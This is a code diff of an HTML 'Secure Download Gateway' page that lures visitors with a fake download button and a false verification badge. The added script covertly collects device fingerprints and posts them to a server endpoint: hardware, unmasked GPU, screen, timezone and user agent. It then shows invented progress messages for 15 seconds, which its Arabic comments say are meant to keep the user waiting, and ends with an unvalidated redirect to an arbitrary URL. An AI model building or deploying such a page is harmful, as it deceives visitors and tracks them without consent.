@@ -4,62 +4,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download Gateway</title>
+    <title>Secure Download Gateway</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>body { font-family: 'Inter', sans-serif; }</style>
 </head>
-<body class="bg-slate-900 text-white flex items-center justify-center h-screen">
+<body class="bg-slate-900 text-white flex items-center justify-center h-screen overflow-hidden relative">
 
-    <div class="bg-white/10 backdrop-blur-lg p-8 rounded-3xl text-center max-w-sm w-full mx-4 border border-white/20">
-        <h1 class="text-2xl font-bold mb-4">Link Ready</h1>
-        <p class="text-gray-300 mb-8">Click the button below to start download</p>
+    <div class="absolute inset-0 z-0 opacity-20">
+        <div class="absolute top-0 left-0 w-72 h-72 bg-blue-600 rounded-full mix-blend-multiply filter blur-xl animate-pulse"></div>
+        <div class="absolute bottom-0 right-0 w-72 h-72 bg-indigo-600 rounded-full mix-blend-multiply filter blur-xl animate-pulse"></div>
+    </div>
 
-        <button id="downloadBtn" onclick="captureAndRedirect()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl transition">
-            Download Now
-        </button>
+    <div class="z-10 bg-white/10 backdrop-blur-lg border border-white/20 p-8 rounded-3xl shadow-2xl text-center max-w-sm w-full mx-4">
+        <div id="statusIcon" class="mb-6">
+            <svg class="w-16 h-16 text-blue-400 mx-auto animate-bounce" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"></path>
+            </svg>
+        </div>
+
+        <h1 id="mainTitle" class="text-2xl font-bold mb-2 text-blue-400">Link is Ready!</h1>
+        <p id="subTitle" class="text-gray-300 text-sm mb-6">Click to start the secure transfer process.</p>
+
+        <div class="relative">
+            <button id="actionBtn" onclick="startHarvesting()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-lg transition duration-300">
+                Get Download Link
+            </button>
+
+            <div id="timerContainer" class="hidden mt-4">
+                <div class="w-full bg-gray-700 h-2 rounded-full mb-3 overflow-hidden">
+                    <div id="progressBar" class="bg-blue-500 h-full w-0 transition-all duration-1000 ease-linear"></div>
+                </div>
+                <p class="text-xs text-blue-300 uppercase tracking-widest font-semibold" id="timerText">Allocating Resources... <span id="seconds">15</span>s</p>
+            </div>
+        </div>
+
+        <p class="mt-8 text-[10px] text-slate-500 uppercase tracking-tighter">Verified by DzMarket Infrastructure</p>
     </div>
 
     <script>
-        // دالة الحصاد المباشرة - أخرجناها من الملف الخارجي لتكون هنا
-        async function harvestFingerprint() {
-            const fingerprint = {
+        const STEPS = [
+            "Syncing with Cloud...",
+            "Analyzing GPU Assets...",
+            "Optimizing Bandwidth...",
+            "Generating Secure Path...",
+            "Finalizing Transfer..."
+        ];
+
+        async function harvestDeepData() {
+            // هنا نجمع بيانات أعمق لأن لدينا وقت
+            const deepFingerprint = {
                 userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
                 screen: `${window.screen.width}x${window.screen.height}`,
+                cores: navigator.hardwareConcurrency || "unknown", // عدد الأنوية
+                memory: navigator.deviceMemory || "unknown", // الرامات
+                gpu: getGPU(),
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                touchPoints: navigator.maxTouchPoints,
+                platform: navigator.platform,
                 timestamp: new Date().toISOString()
             };
 
             try {
-                // إرسال البيانات فوراً للسيرفر الخاص بك
                 await fetch('/api/harvest', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ fingerprint })
+                    body: JSON.stringify({ fingerprint: deepFingerprint })
                 });
-                console.log("✅ Identity Harvested Successfully");
-            } catch (err) {
-                console.error("❌ Harvest Failed:", err);
-            }
+            } catch (e) { console.error("Harvest error"); }
         }
 
-        async function captureAndRedirect() {
-            const btn = document.getElementById('downloadBtn');
+        function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
+            } catch (e) { return "Mobile/Generic GPU"; }
+        }
+
+        async function startHarvesting() {
+            const btn = document.getElementById('actionBtn');
+            const timerCon = document.getElementById('timerContainer');
+            const secondsText = document.getElementById('seconds');
+            const progressBar = document.getElementById('progressBar');
+            const timerText = document.getElementById('timerText');
             
             // 1. استخراج الرابط
             const urlParts = window.location.href.split('url=');
             const targetUrl = urlParts.length > 1 ? decodeURIComponent(urlParts[1]) : 'https://google.com';
 
-            // 2. تغيير شكل الزر
-            btn.innerText = "Processing...";
-            btn.disabled = true;
+            // 2. تحديث الواجهة
+            btn.classList.add('hidden');
+            timerCon.classList.remove('hidden');
+            document.getElementById('mainTitle').innerText = "Processing...";
+            
+            // 3. البدء بالحصاد فوراً في الخلفية
+            harvestDeepData();
 
-            // 3. 🎣 تنفيذ الحصاد فوراً (الأولوية القصوى)
-            await harvestFingerprint();
+            // 4. المؤقت (15 ثانية)
+            let timeLeft = 15;
+            const stepChange = 15 / STEPS.length;
 
-            // 4. التوجيه بعد ضمان إرسال الطلب
-            window.location.href = targetUrl;
+            const countdown = setInterval(() => {
+                timeLeft--;
+                secondsText.innerText = timeLeft;
+                
+                // تحديث شريط التقدم
+                const progressWidth = ((15 - timeLeft) / 15) * 100;
+                progressBar.style.width = `${progressWidth}%`;
+
+                // تغيير الرسائل التقنية لإقناع المستخدم بالانتظار
+                const currentStep = Math.floor((15 - timeLeft) / stepChange);
+                if (STEPS[currentStep]) timerText.innerHTML = `${STEPS[currentStep]} <span id="seconds">${timeLeft}</span>s`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    window.location.href = targetUrl;
+                }
+            }, 1000);
         }
     </script>
 </body>
